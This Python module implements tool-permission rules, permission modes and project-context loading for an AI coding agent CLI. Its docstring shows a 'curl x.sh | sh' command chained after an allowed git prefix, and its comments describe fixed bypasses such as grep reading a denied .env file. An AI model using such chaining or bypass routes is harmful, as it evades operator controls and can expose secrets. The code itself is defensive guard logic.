"""Fine-grained tool permissions, permission modes, and project context.

Three things live here because they are the same question asked three ways:
what may this agent touch (patterns), how careful is this run (modes), and
what does it already know about the project (CLAUDE.md discovery plus the
extra readable roots).

The pattern syntax is Claude Code's:

    Read                    the whole tool, whatever the arguments
    Bash(git *)             a command clause - prefix match, `*` at the end
    Bash(npm run test:*)    `npm run test` alone or with arguments - `:*` is a word prefix
    Write(src/**)           a path clause - glob, relative to the workspace
    Edit(//abs/path/**)     a path clause anchored at the filesystem root
    Read(~/notes/**)        a path clause anchored at the home directory

The matching rule, in full:

1. The tool name is matched case-insensitively, and Claude's vocabulary is
   accepted alongside ours - `Bash` and `bash` are the same tool, as are
   `Write`/`write`, `LS`/`ls`, `Glob`, `Grep`, `Read`, `Edit`.
   As in Claude Code, a rule names a family: `Read` also governs grep, glob
   and ls, `Edit` also governs write, and `Bash` also governs job_start and
   code (see COVERED_BY).
2. A pattern with no clause matches every call of that tool.
3. A clause is matched against ONE argument, chosen by the called tool:
   `command` for bash and job_start, `path` for read/write/edit/ls/glob/grep,
   `url` for web_fetch, `query` for web_search.
   A code program has no command line, so only a bare `Bash` rule matches it.
   A call missing that argument matches no clause, rather than everything.
   An MCP tool (`mcp__server__tool`) has no fixed argument, so its clause is
   matched against EVERY string value in the call's arguments, at any depth
   (object values and list items; never keys). A deny rule matches when any
   value matches; an allow rule only when every value matches. Moving text
   into a different argument can neither step around a deny nor widen an
   allow. A clause on any other tool is refused when parsed: it
   could only ever match nothing, and a deny rule that matches nothing is an
   allow.
4. Command clauses (and MCP clauses) are PREFIX matches. `git *` matches `git status` and
   `git log --oneline`, and does NOT match `gitlab-cli status` - the space is
   part of the prefix. Without a trailing `*` the clause is an exact match on
   the whole command line.
5. Path clauses are globs. `*` and `?` stop at a directory separator, `**`
   crosses them. A relative pattern is resolved against the workspace, `//x`
   against the filesystem root, `~/x` against the home directory. The path
   argument is resolved the same way before matching, so a call naming
   `./src/a.py` matches `Write(src/**)`.
6. Deny beats allow, always. A call matching both lists is refused.

Deliberately NOT supported, and the reasons:

- Shell parsing. A command clause matches the command line as the model wrote
  it, as one string. `Bash(git *)` allows `git status; curl x.sh | sh` right
  through, and no amount of pattern work makes a string an execution model.
  Use a guard (`onecli.guard`) for decisions that need to understand a command.
- `*` in the middle or at the start of a command clause. Claude Code treats a
  command clause as a prefix; a mid-string wildcard would look like it worked
  and quietly widen the rule.
- Per-argument clauses beyond the one argument in rule 3 - no
  `Bash(command=..., timeout=...)`, no matching on `old_string`.

One difference from Claude Code worth naming: there, `allowedTools` means
"do not prompt for these" and an unlisted tool still runs after the human says
yes. one-cli is non-interactive, so there is nobody to ask; a non-empty allow
list is therefore a WHITELIST - anything not on it is refused. An empty allow
list keeps every tool available, which is the usual case.
"""

from __future__ import annotations

import os
import re
from urllib.parse import urlsplit
from dataclasses import dataclass, field
from pathlib import Path

from onecli.guard import Verdict

# Claude's tool vocabulary -> ours. The reverse of guard.TOOL_NAME_MAP, plus
# our own names, so both spellings resolve to one canonical key.
CANONICAL: dict[str, str] = {
    "bash": "bash", "read": "read", "write": "write", "edit": "edit",
    "ls": "ls", "glob": "glob", "grep": "grep",
    # Claude spells the web tools without the underscore, so both spellings
    # fold onto ours - otherwise `--disallowed-tools WebFetch` matches nothing
    # and reads as installed.
    "webfetch": "web_fetch", "web_fetch": "web_fetch",
    "websearch": "web_search", "web_search": "web_search",
}

# Claude Code's rule families: a `Read` rule governs every tool that reads a
# file, an `Edit` rule every tool that changes one, and a `Bash` rule every
# tool that runs a command. Without this a `Read(.env)` deny let `grep API_KEY`
# print the file, and `--disallowed-tools Bash` left `job_start` running shell.
# Per called tool: the rule tools, besides its own name, that also govern it.
COVERED_BY: dict[str, frozenset[str]] = {
    "grep": frozenset({"read"}), "glob": frozenset({"read"}),
    "ls": frozenset({"read"}),
    "write": frozenset({"edit"}),
    "edit": frozenset({"read"}),
    "job_start": frozenset({"bash"}),
    # A program is not a command line, so no `Bash(...)` clause can match it;
    # only a bare `Bash` rule does. Any active rule also confines the program
    # (codemode.confinement_reason), and its own shell calls are gated singly.
    "code": frozenset({"bash"}),
}

# Which single argument a clause is matched against, per called tool.
CLAUSE_ARG: dict[str, str] = {
    "bash": "command", "job_start": "command",
    "read": "path", "write": "path", "edit": "path",
    "ls": "path", "glob": "path", "grep": "path",
    "web_fetch": "url", "web_search": "query",
}

MCP_PREFIX = "mcp__"

PATH_TOOLS = {"read", "write", "edit", "ls", "glob", "grep"}

MODES = ("default", "acceptEdits", "plan", "bypassPermissions", "readOnly")

# `todo_write` is here on purpose: it changes nothing outside the session's own
# bookkeeping, and plan mode is the one mode whose entire output is a plan.
READ_ONLY_TOOLS = ["read", "skill", "ls", "glob", "grep", "todo_write"]

# Reading the web changes nothing, so it belongs in the read-only surface - but
# only where it exists. Web tools are registered only by an installation that
# provides them, and offering a name the registry does not hold would raise on
# schema build, so the surface is filtered against what is actually registered.
READ_ONLY_WEB_TOOLS = ["web_search", "web_fetch"]

PLAN_SYSTEM = """
You are in PLAN MODE. Every tool that changes anything - write, edit, bash -
has been withheld; you can only read, list, glob, grep, and - where this host
has them - search and fetch the web. Do not claim to have
changed a file: nothing you do in this mode can.

Investigate first, then answer with a plan: the files you would change, what
each change is, and in what order. End with the line
"No changes were made - this is a plan."
""".strip()

_PATTERN = re.compile(r"^\s*([A-Za-z_][\w-]*(?:__[\w-]+)*)\s*(?:\((.*)\)\s*)?$",
                      re.DOTALL)


def canonical_tool(name: str) -> str:
    """Fold `Bash` and `bash` onto one key. Unknown names pass through lowered."""
    return CANONICAL.get(name.strip().lower(), name.strip().lower())


def _glob_to_regex(pattern: str) -> re.Pattern:
    """Translate a path glob. `**` crosses separators, `*` and `?` do not."""
    out = []
    i = 0
    while i < len(pattern):
        ch = pattern[i]
        if ch == "*":
            if pattern[i + 1:i + 2] == "*":
                i += 2
                # `**/` is zero or more whole directories, so `src/**/a.py`
                # matches `src/a.py` and `src/x/a.py` but never `src/xa.py`.
                if pattern[i:i + 1] == "/":
                    out.append("(?:.*/)?")
                    i += 1
                else:
                    out.append(".*")
                continue
            out.append("[^/]*")
        elif ch == "?":
            out.append("[^/]")
        else:
            out.append(re.escape(ch))
        i += 1
    return re.compile("^" + "".join(out) + "$")


def _anchor(clause: str, workspace: str) -> str:
    """Resolve the literal prefix, retaining wildcards for policy matching."""
    if clause.startswith("//"):
        clause = "/" + clause[2:].lstrip("/")
    clause = os.path.expanduser(clause)
    # Normalize only literal components; glob components are not paths.
    parts = clause.split("/")
    first = next((i for i, part in enumerate(parts) if "*" in part or "?" in part), len(parts))
    if not os.path.isabs(clause):
        # Relative allowlists must not grant access through a symlink escape.
        prefix = os.path.normpath(os.path.join(os.path.realpath(workspace),
                                             "/".join(parts[:first])))
        return os.path.join(prefix, *parts[first:]) if first < len(parts) else prefix
    prefix = os.path.realpath("/".join(parts[:first]) or "/")
    return os.path.join(prefix, *parts[first:]) if first < len(parts) else prefix


def resolve_path(workspace: str, path: str) -> str:
    """Resolve existing symlink ancestors, including for not-yet-created files.

    This is a policy check, not a sandbox: filesystem tools additionally use
    descriptor-relative no-follow traversal to avoid symlink swap races.
    """
    p = os.path.expanduser(str(path))
    if not os.path.isabs(p):
        p = os.path.join(os.path.abspath(workspace), p)
    return os.path.realpath(p)


@dataclass
class Rule:
    """One parsed pattern. `clause` is None for a bare tool name."""

    tool: str
    clause: str | None = None
    raw: str = ""

    @classmethod
    def parse(cls, text: str) -> "Rule":
        m = _PATTERN.match(text)
        if not m:
            raise ValueError(
                f"bad tool pattern {text!r}. Expected `Tool` or `Tool(clause)`, "
                f"e.g. Read, Bash(git *), Write(src/**)."
            )
        name, clause = m.group(1), m.group(2)
        tool = canonical_tool(name)
        if clause is not None:
            clause = clause.strip()
            if not clause:
                raise ValueError(f"empty clause in tool pattern {text!r}")
            if tool not in CLAUSE_ARG and not tool.startswith(MCP_PREFIX):
                # Such a clause could never match, and a deny rule that never
                # matches silently allows what it names.
                raise ValueError(
                    f"tool pattern {text!r}: {name} takes no clause. Use the "
                    f"bare name, or a clause on one of: Bash, Read, Write, Edit, "
                    f"LS, Glob, Grep, WebFetch, WebSearch, mcp__server__tool.")
        return cls(tool=tool, clause=clause, raw=text.strip())

    def matches(self, tool: str, arguments: dict, workspace: str, *, deny: bool = False) -> bool:
        called = canonical_tool(tool)
        families = COVERED_BY.get(called, ())
        if called == "edit" and not deny:
            families = ()
        if called != self.tool and self.tool not in families:
            return False
        if self.clause is None:
            return True
        if called.startswith(MCP_PREFIX):
            hits = [self._command_matches(v) or self._url_matches(v)
                    for v in _string_values(arguments)]
            # Deny on any matching value, allow only when every value matches:
            # either way, moving text into another argument cannot widen what runs.
            return any(hits) if deny else bool(hits) and all(hits)
        arg = CLAUSE_ARG.get(called)
        if arg is None or arg not in arguments:
            # A clause on a tool with no matchable argument matches nothing.
            # The other reading - "no argument, so the clause is vacuous" -
            # turns Write(src/**) into Write the moment an argument is renamed.
            return False
        value = str(arguments[arg])
        if called in PATH_TOOLS:
            try:
                target = resolve_path(workspace, value)
            except ValueError:
                # A NUL byte names no file. Fail closed: a deny rule matches,
                # an allow rule does not.
                return deny
            return _glob_to_regex(_anchor(self.clause, workspace)).match(target) is not None
        if called == "web_fetch":
            return self._url_matches(value)
        return self._command_matches(value)

    def _url_matches(self, value: str) -> bool:
        clause = self.clause or ""
        if clause == "*":
            return True
        prefix = clause.endswith("*")
        try:
            rule = urlsplit(clause[:-1] if prefix else clause)
            url = urlsplit(value.strip())
            def origin(parsed):
                scheme = parsed.scheme.lower()
                return (scheme, (parsed.hostname or "").rstrip(".").lower(),
                        parsed.port if parsed.port is not None else {"https": 443, "http": 80}.get(scheme))
            if not rule.hostname or origin(rule) != origin(url):
                return False
            wanted = (rule.path or "/") + ("?" + rule.query if rule.query else "")
            actual = (url.path or "/") + ("?" + url.query if url.query else "")
            return actual.startswith(wanted) if prefix else actual == wanted
        except ValueError:
            return False

    def _command_matches(self, command: str) -> bool:
        clause = self.clause or ""
        command = command.strip()
        if clause.endswith(":*"):
            # Claude Code's prefix form: `Bash(git push:*)` is `git push` alone
            # or followed by arguments, never `git pushx` and never the literal
            # `git push:...` a plain trailing `*` would have matched.
            base = clause[:-2]
            return command == base or (command.startswith(base)
                                       and command[len(base):][:1].isspace())
        if clause.endswith("*"):
            return command.startswith(clause[:-1])
        return command == clause


def _string_values(value) -> list[str]:
    """Every string in a call's arguments, at any depth; keys excluded."""
    if isinstance(value, str):
        return [value]
    if isinstance(value, dict):
        return [s for v in value.values() for s in _string_values(v)]
    if isinstance(value, (list, tuple)):
        return [s for v in value for s in _string_values(v)]
    return []


def parse_rules(items: list[str] | None) -> list[Rule]:
    """Parse a repeatable, comma-separated option into rules.

    Commas inside a clause are left alone - `Bash(git commit -m a,b)` is one
    rule - by only splitting on commas outside parentheses.
    """
    rules: list[Rule] = []
    for item in items or []:
        for piece in _split_outside_parens(item):
            piece = piece.strip()
            if piece:
                rules.append(Rule.parse(piece))
    return rules


def _split_outside_parens(text: str) -> list[str]:
    out: list[str] = []
    buf: list[str] = []
    depth = 0
    for ch in text:
        if ch == "(":
            depth += 1
        elif ch == ")":
            depth = max(0, depth - 1)
        if ch == "," and depth == 0:
            out.append("".join(buf))
            buf = []
            continue
        buf.append(ch)
    out.append("".join(buf))
    return out


@dataclass
class PermissionGuard:
    """Allow and deny lists, evaluated as a guard so the loop needs no new seam.

    Deny wins over allow. A non-empty allow list is a whitelist - see the
    module docstring for why that differs from Claude Code.
    """

    name = "permissions"

    allow: list[Rule] = field(default_factory=list)
    deny: list[Rule] = field(default_factory=list)
    workspace: str = ""

    def check(self, tool_name: str, arguments: dict, mutating: bool) -> Verdict:
        for rule in self.deny:
            if rule.matches(tool_name, arguments, self.workspace, deny=True):
                return Verdict.deny(
                    f"{tool_name} is on the disallowed list (matched "
                    f"{rule.raw!r}).", source=self.name)
        if not self.allow:
            return Verdict.allow()
        for rule in self.allow:
            if rule.matches(tool_name, arguments, self.workspace):
                return Verdict.allow()
        return Verdict.deny(
            f"{tool_name} is not on the allowed list "
            f"({', '.join(r.raw for r in self.allow)}).", source=self.name)


@dataclass
class RootsGuard:
    """Refuse a file tool reaching outside the workspace and the added roots.

    Only the path tools are covered. `bash` is not, and cannot be: a shell
    command is a program, not a path, and pretending otherwise would sell a
    containment story the mechanism cannot keep. Sandbox the shell, or guard
    it with `--guard`.
    """

    name = "roots"

    roots: list[str] = field(default_factory=list)
    workspace: str = ""
    read_roots: list[str] = field(default_factory=list)

    def check(self, tool_name: str, arguments: dict, mutating: bool) -> Verdict:
        tool = canonical_tool(tool_name)
        if tool not in PATH_TOOLS:
            return Verdict.allow()
        try:
            target = resolve_path(self.workspace, arguments.get("path", "."))
        except ValueError as exc:
            # A NUL byte in a model-supplied path: refuse the call, not the turn.
            return Verdict.deny(f"invalid path: {exc}", source=self.name)
        roots = self.roots + (self.read_roots if not mutating and tool not in {"write", "edit"} else [])
        for root in roots:
            root = os.path.realpath(root)
            if target == root or target.startswith(root.rstrip("/") + "/"):
                return Verdict.allow()
        return Verdict.deny(
            f"{target} is outside the workspace and the directories added with "
            f"--add-dir. Readable roots: {', '.join(self.roots)}. To allow it, "
            f"rerun with --add-dir naming its directory.",
            source=self.name)


def path_guards(guard) -> list:
    """Only built-in path policies; do not re-run external hooks per file."""
    if isinstance(guard, (PermissionGuard, RootsGuard)):
        return [guard]
    return [item for child in getattr(guard, "guards", []) for item in path_guards(child)]


def normalise_mode(mode: str | None, read_only: bool = False) -> str:
    """Fold `--read-only` and a mode flag into one mode name."""
    if mode is None:
        return "readOnly" if read_only else "default"
    if mode not in MODES:
        raise ValueError(f"unknown permission mode {mode!r}. "
                         f"Choose from {', '.join(MODES)}.")
    if read_only and mode == "default":
        return "readOnly"
    if read_only and mode in ("acceptEdits", "bypassPermissions"):
        # The two flags say opposite things and one of them used to lose in
        # silence: `--read-only --permission-mode bypassPermissions` edited a
        # file for real, with nothing in the output admitting that --read-only
        # had been dropped. On a flag whose whole job is "do not touch my
        # files", the safe reading is not to pick a winner - it is to say the
        # instruction was contradictory. `plan` is exempt because it is not
        # looser than read-only, so nothing is lost by keeping it.
        raise ValueError(
            f"--read-only and --permission-mode {mode} contradict each other: "
            "one withholds every mutating tool and the other allows them all. "
            "Pass one.")
    return mode


def tool_names_for(mode: str) -> list[str] | None:
    """The tools the model is offered. None means all of them.

    `acceptEdits` is the same surface as `default` here: it means "do not stop
    to ask before an edit", and one-cli never stops to ask. It is accepted so a
    Claude Code invocation runs unchanged rather than dying on an unknown value.
    """
    if mode in ("readOnly", "plan"):
        from onecli import tools as toolkit  # lazy: avoids an import cycle
        # An MCP tool that declares readOnlyHint is a read, so it belongs in a
        # read-only surface; one that declares nothing counts as mutating and is
        # withheld. The protocol answers this, so we do not have to guess.
        mcp = sorted(n for n, t in toolkit.REGISTRY.items()
                     if n.startswith("mcp__") and not t.mutating)
        web = [n for n in READ_ONLY_WEB_TOOLS if n in toolkit.REGISTRY]
        return list(READ_ONLY_TOOLS) + web + mcp
    return None


def system_suffix_for(mode: str) -> str:
    return PLAN_SYSTEM if mode == "plan" else ""


def build_roots(workspace: str, add_dirs: list[str] | None) -> list[str]:
    return [os.path.abspath(workspace)] + [
        os.path.abspath(os.path.expanduser(d)) for d in (add_dirs or [])
    ]


def build(workspace: str, mode: str = "default",
          allowed: list[str] | None = None, disallowed: list[str] | None = None,
          add_dirs: list[str] | None = None) -> list:
    """The guards this module contributes to the chain, in order.

    The file tools are confined to the workspace and the `--add-dir` roots in
    every mode, `bypassPermissions` included: a read-only run must not read
    credentials by absolute path. `bypassPermissions`
    drops only the allow and deny lists. It does NOT disable `--guard`
    subprocesses - Claude Code still runs PreToolUse hooks in that mode, and a
    guard is the layer an operator installs precisely because it should
    outlast a permissive flag.
    """
    workspace = os.path.abspath(workspace)
    guards: list = []
    allow, deny = parse_rules(allowed), parse_rules(disallowed)
    if (allow or deny) and mode != "bypassPermissions":
        guards.append(PermissionGuard(allow=allow, deny=deny, workspace=workspace))
    guards.append(RootsGuard(roots=build_roots(workspace, add_dirs),
                             workspace=workspace))
    return guards


def chain(workspace: str, mode: str = "default", commands: list[str] | None = None,
          timeout: float | None = None, allowed: list[str] | None = None,
          disallowed: list[str] | None = None,
          add_dirs: list[str] | None = None):
    """The whole guard chain a run installs: read-only, --guard, then ours.

    One builder for the one-shot path and the chat, so a flag cannot be
    honoured by one entry and silently dropped by the other.
    """
    from onecli import guard as guardlib
    workspace = os.path.abspath(workspace)
    built = guardlib.build(
        commands=commands, read_only=mode in ("readOnly", "plan"),
        workspace=workspace,
        timeout=guardlib.DEFAULT_TIMEOUT if timeout is None else timeout)
    built.guards.extend(build(workspace=workspace, mode=mode, allowed=allowed,
                              disallowed=disallowed, add_dirs=add_dirs))
    return built


# --- project context -------------------------------------------------------

CONTEXT_FILENAME = "CLAUDE.md"
SEPARATOR = "=" * 60


def git_root(start: str) -> str | None:
    """The nearest ancestor containing `.git`, or None. No subprocess.

    A directory we are not allowed to stat answers the question the same way
    an empty one does: not here, keep walking. `Path.exists()` does not agree -
    it swallows ENOENT and ENOTDIR and re-raises EACCES - so a workspace the
    user cannot read reached the top of the CLI as a raw PermissionError
    traceback, from a function whose whole contract is "or None".
    """
    here = Path(os.path.abspath(start))
    for candidate in [here, *here.parents]:
        try:
            if (candidate / ".git").exists():
                return str(candidate)
        except OSError:
            continue
    return None


def context_files(workspace: str, home: str | None = None) -> list[str]:
    """Workspace instructions and identity, then ancestor and user instructions.

    Load CLAUDE.md, AGENTS.md and SOUL.md in the selected workspace.
    Ancestors through the git root contribute CLAUDE.md and AGENTS.md,
    never another workspace identity. Finish with the selected global file.
    """
    workspace = os.path.abspath(workspace)
    home = os.path.expanduser("~") if home is None else home
    found: list[str] = []

    def add(path: str) -> None:
        if os.path.islink(path):
            import sys
            print(f"warning: refusing symlink context file: {path!r}", file=sys.stderr)
            return
        if os.path.isfile(path) and path not in found:
            found.append(path)

    add(os.path.join(workspace, CONTEXT_FILENAME))
    add(os.path.join(workspace, "AGENTS.md"))
    add(os.path.join(workspace, "SOUL.md"))
    root = git_root(workspace)
    if root and root != workspace:
        for parent in Path(workspace).parents:
            add(str(parent / CONTEXT_FILENAME))
            add(str(parent / "AGENTS.md"))
            if str(parent) == root:
                break
    from . import global_context
    add(str(global_context.instruction_path(home)))
    return found


def project_context(workspace: str, home: str | None = None,
                    existing: str = "") -> str:
    """The discovered files as one block, each under a labelled separator."""
    blocks = []
    present = existing
    for path in context_files(workspace, home):
        try:
            from . import secureio
            with secureio.text_file(path, errors="replace") as fh:
                body = fh.read().strip()
        except OSError:
            import sys
            print(f"warning: refusing context file: {path!r}", file=sys.stderr)
            continue
        # Skip only a complete, verbatim body already present. Partial overlap
        # must never discard additional project or safety instructions.
        if body and body not in present:
            blocks.append(f"{SEPARATOR}\nPROJECT CONTEXT: {path}\n{SEPARATOR}\n{body}")
            present += "\n\n" + body
    return "\n\n".join(blocks)


def compose_system(base: str, workspace: str, mode: str = "default",
                   project: bool = True, home: str | None = None,
                   trust_project: bool = False) -> str:
    """Base prompt, then the mode's instructions, then the project context."""
    parts = [base.rstrip()]
    suffix = system_suffix_for(mode)
    if suffix:
        parts.append(suffix)
    if project:
        context = project_context(workspace, home, existing="\n\n".join(parts))
        if context:
            parts.append(context)
        from onecli import skills
        parts.append(skills.disclosure(workspace, home, trust_project))
    return "\n\n".join(p for p in parts if p)


__all__ = [
    "Rule", "PermissionGuard", "RootsGuard", "parse_rules", "canonical_tool",
    "chain", "COVERED_BY", "add_read_root",
    "resolve_path", "build", "build_roots", "normalise_mode", "tool_names_for",
    "system_suffix_for", "context_files", "project_context", "compose_system",
    "git_root", "MODES", "READ_ONLY_TOOLS", "READ_ONLY_WEB_TOOLS",
    "PLAN_SYSTEM", "SEPARATOR",
]


def add_read_root(guard, path):
    """Grant a session-owned output directory for reads only."""
    for item in path_guards(guard):
        if isinstance(item, RootsGuard):
            item.read_roots.append(os.path.abspath(path))
